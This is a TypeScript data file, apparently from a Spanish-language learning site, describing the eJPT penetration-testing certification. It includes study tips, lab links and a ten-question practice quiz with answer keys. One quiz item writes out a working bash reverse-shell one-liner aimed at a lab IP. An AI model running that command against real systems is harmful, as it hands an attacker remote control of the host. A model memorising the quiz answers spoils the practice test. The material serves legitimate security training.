import type { Certification } from "../certifications";

export const elearnsecurityJuniorPenetrationTester: Certification = {
  slug: "elearnsecurity-junior-penetration-tester",
  name: "eLearnSecurity Junior Penetration Tester (eJPT)",
  code: "eJPTv2",
  vendor: "INE",
  badge: "eJPT",
  badgeImage: "/certifications/elearnsecurity-junior-penetration-tester.png",
  level: "Fundamental",
  icon: "terminal",
  accent: "#0d6efd",
  summary:
    "Una certificación de seguridad ofensiva 100% práctica. Te evalúa hackeando una red real para responder preguntas de auditoría técnica.",
  prepTips: [
    "Aprendé a usar Nmap de manera eficiente (velocidades, tipos de escaneo) para descubrir servicios y puertos.",
    "Dominá el uso básico de Metasploit, pero entendé la explotación manual de fallos web como SQLi e IDOR.",
    "Familiarizate con el enrutamiento de red (pivoting) en entornos multi-red durante la fase de post-explotación.",
  ],
  studyResources: [
    {
      name: "Penetration Testing Student (PTS) Path",
      platform: "INE",
      type: "course",
      url: "https://ine.com/learning-paths/ejpt",
      free: false,
      desc: "La ruta de entrenamiento oficial y detallada diseñada por INE para aprobar el examen práctico.",
    },
    {
      name: "Free Ethical Hacking Course",
      platform: "freeCodeCamp / YouTube",
      type: "video",
      url: "https://www.youtube.com/watch?v=3Kq1MIfTWCE",
      free: true,
      desc: "Curso completo introductorio de pentesting de 15 horas que repasa redes, scripts y ataques prácticos.",
    },
  ],
  domainLabs: [
    {
      domainName: "Ataques a aplicaciones web",
      labIds: [
        "ciberseguridad/sql-injection-parametrizada",
        "backend-arquitectura/idor-cambiar-un-id",
        "ciberseguridad/xss-local-defensivo",
      ],
    },
    {
      domainName: "Ataques a redes e infra",
      labIds: [
        "ciberseguridad/docker-socket-to-host",
        "ciberseguridad/por-que-chmod-777",
      ],
    },
    {
      domainName: "Reconocimiento e información",
      labIds: ["redes-internet/dns-paso-a-paso"],
    },
  ],
  meta: {
    questions: 35,
    durationMin: 240,
    passingScore: "70%",
    cost: "USD 250",
    validityYears: 3,
    format:
      "Examen práctico en laboratorio interactivo real (35 preguntas basadas en hallazgos)",
  },
  outcomes: [
    "Realizar escaneos de red activos y pasivos de manera segura.",
    "Identificar y explotar vulnerabilidades web clásicas (OWASP Top 10).",
    "Ejecutar exploits públicos y comprender su funcionamiento interno.",
    "Realizar ataques de red básicos (ARP spoofing, cracking de contraseñas).",
  ],
  domains: [
    { name: "Metodología y evaluación", weight: 25 },
    { name: "Reconocimiento e información", weight: 25 },
    { name: "Ataques a redes e infra", weight: 25 },
    { name: "Ataques a aplicaciones web", weight: 25 },
  ],
  relatedPaths: ["ciberseguridad", "redes-internet", "linux-real"],
  exam: [
    {
      q: "¿Qué parámetro de Nmap realiza un escaneo de tipo TCP SYN (half-open) rápido y sigiloso?",
      options: ["-sT", "-sS", "-sU"],
      answer: 1,
      explain:
        "El flag `-sS` inicia un escaneo SYN (half-open) que no completa el handshake TCP de 3 pasos, reduciendo la probabilidad de ser detectado por logs del host.",
    },
    {
      q: "Encontrás un campo de entrada web vulnerable a XSS que ejecuta código JavaScript en el navegador de cualquier usuario que visite la página. ¿Qué tipo de XSS es?",
      options: ["XSS Reflejado", "XSS Almacenado (Stored)", "DOM-based XSS"],
      answer: 1,
      explain:
        "Si el código dañino se guarda en la base de datos y se muestra a múltiples usuarios persistiendo en la página, es un XSS Almacenado.",
    },
    {
      q: "¿Qué protocolo de red traduce direcciones MAC a direcciones IP locales?",
      options: ["DNS", "DHCP", "ARP"],
      answer: 2,
      explain:
        "El protocolo ARP (Address Resolution Protocol) mapea direcciones IP de la capa de red a direcciones físicas MAC de la capa de enlace.",
    },
    {
      q: "¿Cuál es el propósito principal de la fase de 'Reconocimiento' en un test de penetración?",
      options: [
        "Explotar vulnerabilidades críticas en el servidor",
        "Recopilar tanta información pública y técnica del objetivo como sea posible",
        "Borrar los logs de acceso del sistema comprometido",
      ],
      answer: 1,
      explain:
        "El reconocimiento (footprinting) recopila información activa y pasiva del objetivo para planificar los ataques posteriores y mapear la superficie expuesta.",
    },
    {
      q: "Si lográs explotar un comando de consola vulnerable e inyectás '/bin/bash -i >& /dev/tcp/10.10.10.5/4444 0>&1' para que el servidor se conecte a tu oyente local. ¿Qué creaste?",
      options: [
        "Bind Shell",
        "Reverse Shell (conexión reversa)",
        "Port Forwarding",
      ],
      answer: 1,
      explain:
        "Una reverse shell hace que el host víctima inicie la conexión hacia la máquina del atacante, lo que usualmente evade las reglas de firewall entrantes.",
    },
    {
      q: "¿Qué herramienta es el framework estándar de explotación ofensiva utilizado para buscar exploits, payloads y módulos de escaneo?",
      options: [
        "Wireshark",
        "Metasploit Framework (msfconsole)",
        "John the Ripper",
      ],
      answer: 1,
      explain:
        "Metasploit contiene miles de exploits públicos empaquetados listos para testing y validación de seguridad.",
    },
    {
      q: "Al escanear un puerto web, encontrás que el servidor devuelve el header: 'Server: Apache/2.4.41'. ¿Cómo se llama esta fase?",
      options: [
        "Brute forcing",
        "Banner Grabbing (captura de banner)",
        "Privilege Escalation",
      ],
      answer: 1,
      explain:
        "Banner Grabbing lee los encabezados o respuestas del puerto para identificar la versión exacta del servicio y software corriendo.",
    },
    {
      q: "¿Qué técnica de inyección permite ejecutar consultas SQL no autorizadas en la base de datos a través de campos de entrada mal saneados?",
      options: [
        "Cross-Site Scripting (XSS)",
        "SQL Injection (SQLi)",
        "Command Injection",
      ],
      answer: 1,
      explain:
        "SQLi ocurre cuando datos provistos por el usuario se concatenan directamente en sentencias SQL, permitiendo alterar la lógica de la base de datos.",
    },
    {
      q: "Si querés descifrar hashes de contraseñas guardados en un archivo de texto de manera local y rápida usando un diccionario de palabras. ¿Qué herramienta usás?",
      options: ["Nmap", "John the Ripper (o Hashcat)", "Hydra"],
      answer: 1,
      explain:
        "John the Ripper y Hashcat son craqueadores de contraseñas offline muy veloces que comparan hashes de diccionarios con el objetivo.",
    },
    {
      q: "¿Qué puerto expone por defecto el protocolo SMB (Server Message Block) utilizado para compartir archivos en entornos Windows?",
      options: ["22", "445", "80"],
      answer: 1,
      explain:
        "SMB corre comúnmente sobre el puerto TCP 445 en sistemas modernos para compartir archivos e impresoras.",
    },
  ],
};
